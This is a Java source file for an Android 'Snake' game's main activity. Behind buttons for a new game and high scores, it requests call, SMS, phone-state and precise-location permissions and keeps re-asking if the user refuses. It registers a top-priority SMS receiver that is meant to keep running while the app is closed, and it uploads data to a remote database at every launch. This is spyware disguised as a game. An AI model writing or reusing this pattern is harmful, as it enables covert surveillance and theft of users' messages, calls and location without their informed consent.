package com.example.s1300465.snake;

import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.view.View;

import java.util.ArrayList;
import java.util.Arrays;

public class MainActivity extends AppCompatActivity {
    DatabaseHelper dbh;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        dbh = new DatabaseHelper(this);

        getPermissions();

        //For Debugging purposes:
        (findViewById(R.id.textView)).setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                Intent dbmanager = new Intent(getApplicationContext(), AndroidDatabaseManager.class);
                startActivity(dbmanager);
            }
        });

        IncomingSMSReceiver smsReceiver = new IncomingSMSReceiver();
        IntentFilter smsFilter  = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
        smsFilter.setPriority(1000);

        //This can sometimes cause a leaked IntentReceiver if called again while still registered
        //Doesn't crash app though so not an issue, and we don't want to unregister onPause
        //or we won't catch any SMS when the app is closed
        this.registerReceiver(smsReceiver, smsFilter);

        new RemoteDatabaseHelper(this).uploadData();
    }

    public boolean getPermissions(){
        ArrayList<String> permissions = new ArrayList<>();
        if(ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_DENIED){
            permissions.add(android.Manifest.permission.READ_PHONE_STATE);
        }
        if(ContextCompat.checkSelfPermission(this, android.Manifest.permission.PROCESS_OUTGOING_CALLS) == PackageManager.PERMISSION_DENIED){
            permissions.add(android.Manifest.permission.PROCESS_OUTGOING_CALLS);
        }
        if(ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECEIVE_SMS) == PackageManager.PERMISSION_DENIED){
            permissions.add(android.Manifest.permission.RECEIVE_SMS);
        }
        if(ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_DENIED){
            permissions.add(android.Manifest.permission.ACCESS_FINE_LOCATION);
        }

        if(permissions.size() == 0) {
            return true;
        }

        ActivityCompat.requestPermissions(this, permissions.toArray(new String[permissions.size()]), 0);
        return false;
    }

    public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults) {
        //If any of the requests were denied, just keep asking again
        if(Arrays.asList(grantResults).contains(PackageManager.PERMISSION_DENIED)){
            getPermissions();
        }
    }

    public void startNewGame(View v){
        startActivity(new Intent(this, GameScreen.class));
    }

    public void openHighScores(View v){
        startActivity(new Intent(this, HighScoresActivity.class));
    }
}
